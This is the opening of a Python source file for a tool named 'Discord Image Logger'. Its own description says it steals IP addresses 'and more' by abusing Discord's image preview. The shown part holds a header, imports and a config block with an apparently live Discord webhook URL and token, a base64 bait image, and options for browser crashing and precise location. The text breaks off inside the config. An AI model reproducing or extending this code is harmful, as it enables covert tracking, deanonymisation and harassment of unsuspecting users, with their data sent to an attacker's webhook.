# discord.gg/wingsminer
# Thanks for help DLB, finkyy
# Don't change any settings. This can be this may prevent the code from working.
#
# █     █░█ ██▄    █   ▄████   ██████  ███▄ ▄███▓ ██▓ ███▄    █ ▓█████  ██▀███  
#▓█░ █ ░█░█ █ ▀█   █  ██▒ ▀█▒▒██    ▒ ▓██▒▀█▀ ██▒▓██▒ ██ ▀█   █ ▓█   ▀ ▓██ ▒ ██▒
#▒█░ █ ░█▓█ █  ▀█ ██▒▒██░▄▄▄░░ ▓██▄   ▓██    ▓██░▒██▒▓██  ▀█ ██▒▒███   ▓██ ░▄█ ▒
#░█░ █ ░█▓█ █▒  ▐▌██▒░▓█  ██▓  ▒   ██▒▒██    ▒██ ░██░▓██▒  ▐▌██▒▒▓█  ▄ ▒██▀▀█▄  
#░░██▒██▓▒█ █░   ▓██░░▒▓███▀▒▒██████▒▒▒██▒   ░██▒░██░▒██░   ▓██░░▒████▒░██▓ ▒██▒
#░ ▓░▒ ▒ ░ ▒░   ▒ ▒  ░▒   ▒ ▒ ▒▓▒ ▒ ░░ ▒░   ░  ░░▓  ░ ▒░   ▒ ▒ ░░ ▒░ ░░ ▒▓ ░▒▓░
#  ▒ ░ ░ ░ ░░   ░ ▒░  ░   ░ ░ ░▒  ░ ░░  ░      ░ ▒ ░░ ░░   ░ ▒░ ░ ░  ░  ░▒ ░ ▒░
#  ░   ░    ░   ░ ░ ░ ░   ░ ░  ░  ░  ░      ░    ▒ ░   ░   ░ ░    ░     ░░   ░ 
#    ░            ░       ░       ░         ░    ░           ░    ░  ░   ░     

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "lynxWings"

config = {
    "webhook": "https://discord.com/api/webhooks/1130520803985858591/qd0Cudl1gMjFghJGv0SOV_ECdm0ZtTD4JkERRj_acPQpQH4YqXbgsue3IJ-DD9bhYUMz", # <------------------------- Put your webhook link here.
    "image": "data:image/jpeg;base64,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", # <------------------------- Put image address link here.
    "imageArgument": True,

    "username": "WingsMiner",
    "color": 0x03AC13,

    "crashBrowser": False,
    
    "accurateLocation": False,

